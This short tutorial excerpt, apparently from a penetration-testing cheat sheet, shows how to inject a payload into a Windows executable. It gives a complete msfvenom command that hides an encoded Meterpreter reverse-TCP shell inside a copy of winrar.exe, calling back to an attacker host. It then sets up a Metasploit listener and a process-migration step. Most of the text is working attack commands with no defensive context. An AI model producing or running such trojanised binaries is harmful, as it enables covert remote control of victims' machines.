<h4>Injecting Payloads Into Windows Portable Executables</h4>

>You can use the switch "-x" to select a template to use. And yeah, we can use the winrar executables

After downloading the winrar.exe executable

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /path/to/winrar.exe > winrar.exe
```

After sending the payload to the target machine, set your metasploit handle
```
use exploit/multi/handler
set LHOST
set LHOST
run
```
Then run the post exploitation module to migrate
```
run post/windows/manage/migrate
```
This migrates the process into another one
